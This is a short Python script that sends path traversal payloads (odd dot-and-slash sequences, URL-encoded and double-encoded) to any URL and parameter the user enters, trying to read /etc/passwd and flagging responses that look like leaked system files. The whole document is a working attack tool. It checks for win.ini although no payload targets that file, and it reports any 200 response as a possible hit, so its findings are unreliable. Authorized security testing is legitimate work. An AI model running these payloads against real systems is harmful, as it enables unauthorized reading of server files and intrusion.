import requests

# List of path traversal payloads using non-standard sequences
payloads = [
    ".../...//etc/passwd",              # Unconventional path traversal with redundant slashes
    "....//....//etc/passwd",           # Path traversal with extra dots and slashes
    "...%2f...%2f...%2fetc%2fpasswd",   # URL-encoded path traversal
    "...%252e//....//etc%252fpasswd"   # Double URL-encoded path traversal
]

def check_path_traversal(url, param):
    print(f"Checking Path Traversal Vulnerabilities with '.../...//' on: {url}")

    for payload in payloads:
        full_url = f"{url}?{param}={payload}"
        response = requests.get(full_url, timeout=5)
        
        # Checking for potential exposed sensitive files
        if "root:x:" in response.text:
            print(f"[!] Vulnerability Found: {full_url} (Exposed /etc/passwd)")
        elif "[extensions]" in response.text:
            print(f"[!] Vulnerability Found: {full_url} (Exposed Windows win.ini)")
        elif response.status_code == 200:
            print(f"[!] Possible Vulnerability: {full_url} (Check response manually)")
        else:
            print(f"[-] No issue found at {full_url} (Status Code: {response.status_code})")

# Get URL and parameter input from the user
target_url = input("Please enter the target URL (e.g., https://example.com): ")
target_param = input("Please enter the parameter name (e.g., file): ")
check_path_traversal(target_url, target_param)
